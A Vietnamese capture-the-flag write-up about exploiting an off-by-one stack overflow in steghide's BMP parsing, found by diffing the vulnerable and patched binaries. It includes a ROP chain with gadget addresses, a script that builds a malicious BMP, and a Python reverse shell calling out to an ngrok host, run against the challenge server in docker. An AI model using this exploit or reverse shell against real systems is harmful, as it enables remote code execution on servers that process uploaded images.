**1. Tìm lỗi**
  - Đây là chall dùng 1 tool thực tế có tên là `steghide` nên việc tìm lỗi thông qua `source` rất khó. Tuy nhiên chall này đã cung cấp cho ta 2 file `binary` trong đó có một file có lỗi và một file đã vá, ta chỉ cần chỉ ra điểm khác nhau là có thể dễ dàng tìm thấy được lỗi.
  - A Hy đã chỉ mình dùng tool `Bindiff` để so sánh, và dễ dàng chỉ ra điểm khác nhau ở hàm `BmpFile::readdata()`
  - ![image](https://user-images.githubusercontent.com/113702087/230003701-123b757e-92a1-4b1b-a401-6d46e03ac9e7.png)
  - Khi độ chính xác của hàm này ở 2 file là `99%`.
  - ![image](https://user-images.githubusercontent.com/113702087/230004061-c3aa1828-cf77-48d7-922e-fe84e25583e8.png)
  - Dễ dàng thấy điểm khác nhau tại vòng `for` khi điều kiện lặp ở file lỗi là `<= height` trong khi ở file vá là `< height`. Điều này có thể dẫn đến các lỗi như `overflow`, `out of bound`, ...
  - ![image](https://user-images.githubusercontent.com/113702087/230006389-e6491c26-0bc8-490d-971b-7c86ec58d04c.png)
  - Trong hàm này nó sẽ đọc dữ liệu từ `file` lượng byte tối đa đọc được phụ thuộc vào `height` và `linelength`, tổng lượng byte đọc được sẽ lưu vào `numread` tuy nhiên do `<=` nên `numread` sẽ vượt quá `height*linelength`. Mình sẽ dùng `x` của `ida` để xem `numread` được sử dụng ở đâu.
  - Cho ai thắc mắc thì `height` và `linelength` là chiều rộng và chiều dài của file và nó được đọc từ trường `header` của file thông qua hàm `BmpFile::readheaders()` vậy nên thêm bao nhiêu dữ liệu vào thì giá trị của chúng luôn không đổi.
  - ![image](https://user-images.githubusercontent.com/113702087/230009548-865d05a9-9daa-4e8b-9016-78001dc91068.png)
  - ![image](https://user-images.githubusercontent.com/113702087/230009377-c6ed3fd2-5264-40b9-a966-305c34faf26f.png)
  - Sau khi `readdata` nó sẽ thực hiện `getdata` nơi sẽ gọi `getheaders`. Trong `getheaders` nó thực hiện cấp phát bằng `alloca` trên stack bằng `height*linelength` nhưng nó lại dùng `memcpy(&v3, a1, (unsigned int)numread)` để copy dữ liệu đọc được từ file vào stack với size là `numread`, như đã nói ở trên `numread` có thể > `height*linelength` do đó tại đây nó sẽ gây lỗi `overflow`.
  - Về phía `server` là một `website`
  - ![image](https://user-images.githubusercontent.com/113702087/230004814-79b696e8-b4fb-479b-af81-674edb6c0d2f.png)
  - nó nhận đầu vào là một `file` và `pass` của file này rồi thực thi câu lệnh `subprocess.run(['steghide', 'extract', '-sf', stegfile_name, '-p', request.form['passphrase'], '-xf', outfile_name], check=True, timeout=60)`
  - Có vẻ như `BmpFile::readdata()` sẽ được thực hiện khi ta `extract` một file `bmp` nên ta sẽ dùng `bmp` để gửi `payload`.

**2. Ý tưởng**
  - ![image](https://user-images.githubusercontent.com/113702087/230013813-388a983e-9275-4395-8656-8989c86eae87.png)
  - Ta có thể `overwrite` saverip với 126 byte khá là ít, tuy nhiên đủ để ta tạo shell nhưng việc tạo shell dường như là vô nghĩa khi nó không có `netcat`. Vậy nên ta sẽ chuyển sang hướng `reverse shell` để tạo `shell` về máy mình. Đê làm được điều này ta cần rất nhiều gadget do đó ta sẽ thay đổi rsp thông qua rbp với một địa chỉ ghi được đã biết.
  - Do không thể sử dụng các hàm input vì không có `netcat` nên ta sẽ sử dụng input có sẵn từ file để nạp `gadget` vào một địa chỉ trên binary và trỏ rsp vào đây. Ta có thể lợi dụng `memcpy` lần nữa để đưa các `payload` từ file vào địa chỉ mong muốn do ta có thể thay đổi `rdi` thông qua `pop rdi ; ret`.
  - Trước khi `ret` các thanh ghi có giá trị như sau:
  - ![image](https://user-images.githubusercontent.com/113702087/230015037-8418ddf8-ae2e-4d3b-81f6-eaaa5f467e63.png)
  - Dường như sau khi `memcpy` thì `rsi` và `rdi` đã thay đổi chỉ còn lại `rdx`. Tuy nhiên `rdi` mới này lại cách `rsi` cũ `0x58` byte vậy nên có thể coi nó là `rsi` cũ, việc cần làm là chuyển `mov rsi, rdi ;  pop rdi ; ret ; memcpy` thì ta có thể thực hiện chuyển `payload` sang địa chỉ tùy ý. Nhưng gần như không có gadget nào thỏa mãn điều này. Các gadget control `rsi` dường như sẽ khiến chương trình `exit`.
  -  Sau một lúc suy ngẫm thì mình thấy được cái này.
  -  ![image](https://user-images.githubusercontent.com/113702087/230018211-eb4539b8-9a4f-4513-91c8-98d3258c69c4.png)
  -  ![image](https://user-images.githubusercontent.com/113702087/230018590-232045e1-e886-4384-a83b-e5b49b3125d2.png)
  - Một phần của hàm `getheaders()`, điều này có nghĩa là ta sẽ thay đổi được `[rbp+dest]` và `[rbp+src]`, ban đầu ta sẽ thay đổi `rbp` rồi đưa `rdi` vào `[rbp+src]`, như thế ta có thể copy `payload` vào địa chỉ tùy ý rồi.
  - ![image](https://user-images.githubusercontent.com/113702087/230021665-e1162f76-40f8-443a-97a2-40e31c4f0816.png)
  - Việc bây giờ ta chỉ tính `offset` và thực thi `reverse shell`
  - Mình sẽ chọn `python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"0.tcp.ap.ngrok.io\",13577));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'` để làm `reverse shell`, rồi thực thi `system(reverseshell)`

**3. Khai thác**
  ```
  pop_rax_rbx_rbp = 0x0000000000414d29
pop_rsi = 0x0000000000417f3e
pop_rdx = 0x000000000042cd0c
pop_rdi = 0x0000000000450e8b
add_irbp_ebx = 0x0000000000404a38
pop_rbp = 0x0000000000404a39
leave_ret = 0x000000000040a392
syscall = 0x00000000004066b3
addr = 0x48a930
movinrbp_rdi = 0x00000000004220e0
  ```
  - setup một số `gadget` có ích
  ```
  headerfile = b'BMzL\x02\x00\x00\x00\x00\x00>\x00\x00\x00(\x00\x00\x00\xd3\x05\x00\x00!\x03\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00<L\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00'
shellrv = f'python3 -c \x27import os,pty,socket;s=socket.socket();s.connect((\x22{ip}\x22,{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\x22sh\x22)\x27\x00'
shell = headerfile + b'a'*(len(shellrv)-10 - 8)
  shell += flat(
    pop_rax_rbx_rbp+1, 0x13e10, exe.got['gettext'] + 0x3d,
    add_irbp_ebx,
    pop_rdi, 0x48abd4,
    exe.sym['gettext'],
    word_size=64, sign = True
)
  ```
  - Đầu tiên ta sẽ tạo một `headerfile` và `reverse_shell`, căn chỉnh thêm `offset` rồi đưa các `gadget` vào các `gadget` này sẽ được thực thi sau khi thay đổi được rsp
  - `gadget` trên sẽ thay đổi `gettext got` thành `system` và thực thi `reverse shell`
  ```
  shell += shellrv.encode()*29
shell = shell.ljust(0x24c71, b'\xff') + 0x3e*b'a'
  ```
  - Tiếp đến ta sẽ đưa `reverse shell` vào và bù thêm một phần để `overflow` đoạn `memcpy`.
  ```
  rop = flat(
    addr,
    movinrbp_rdi, addr + 8,
    pop_rdi, addr,
    movinrbp_rdi, addr + 0x20,
    pop_rdx, 0x6d0,
    0x41B355,
    pop_rbp, addr,
    leave_ret,
    word_size=64, sign = True
)

shell += rop
  ```
  - ROP này sẽ được chèn vào khi `overflow` nhằm thực hiện lại `memcpy` như đã nói ở trên và thay đổi `rsp`.

**4. Demo trên docker**
  - Mình test trên `docker` được nhưng `server` thì lỗi nên sẽ làm trên `docker`.
  - ![image](https://user-images.githubusercontent.com/113702087/230026857-978c0b29-a759-4c2b-a375-3aa14e069da8.png)
  - Ta tạo host thông qua `ngrok` và `listen` tại port `8080`. Rồi tạo file ảnh với `script` trên theo `ip` và `port`
  - Ta sẽ gửi file ảnh lên `web` và chờ kết quả
  - ![image](https://user-images.githubusercontent.com/113702087/230027418-d7f1184e-a457-4d42-97e4-ae59028f615f.png)
  - ![image](https://user-images.githubusercontent.com/113702087/230027932-bc1f95db-6601-45f8-b848-4a508c11b3ba.png)
